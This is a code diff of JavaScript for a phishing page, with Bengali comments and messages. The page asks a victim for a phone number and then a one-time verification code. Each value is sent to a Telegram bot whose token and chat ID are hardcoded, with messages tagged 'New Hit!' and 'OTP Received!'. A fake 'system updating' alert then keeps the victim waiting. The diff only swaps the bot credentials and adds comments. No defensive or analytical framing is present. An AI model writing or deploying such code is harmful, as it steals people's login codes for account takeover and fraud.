@@ -1,34 +1,45 @@
-const token = '8687954316:AAGU9FMZp7UODi4Agt2V0d0gskohEruY1u0';
-const chatId = '5877893357';
+const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
+const chatId = '8795859465';
 
 let userPhone = "";
 
+// প্রথম ধাপ: নম্বর নেওয়া
 function goToStep2() {
     const phoneInput = document.getElementById('phone').value;
-    if (phoneInput.trim().length < 10) {
+    if (phoneInput.length < 10) {
         alert("সঠিক মোবাইল নম্বর দিন");
         return;
     }
     userPhone = phoneInput;
+    
+    // UI পরিবর্তন
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
     document.getElementById('title').innerText = "Verification";
     document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
+
+    // টেলিগ্রামে প্রথম মেসেজ (নম্বর) পাঠানো
     sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
 }
 
+// দ্বিতীয় ধাপ: ওটিপি সাবমিট
 document.getElementById('mainForm').addEventListener('submit', function(e) {
     e.preventDefault();
     const otpInput = document.getElementById('otp').value;
-    if (otpInput.trim().length < 4) {
+    
+    if (otpInput.length < 4) {
         alert("সঠিক কোড দিন");
         return;
     }
+
+    // টেলিগ্রামে ওটিপি পাঠানো
     sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
+    
     alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
 });
 
+// টেলিগ্রাম ফাংশন
 function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-    fetch(url).then(res => console.log("Sent")).catch(err => console.error(err));
+    fetch(url);
 }
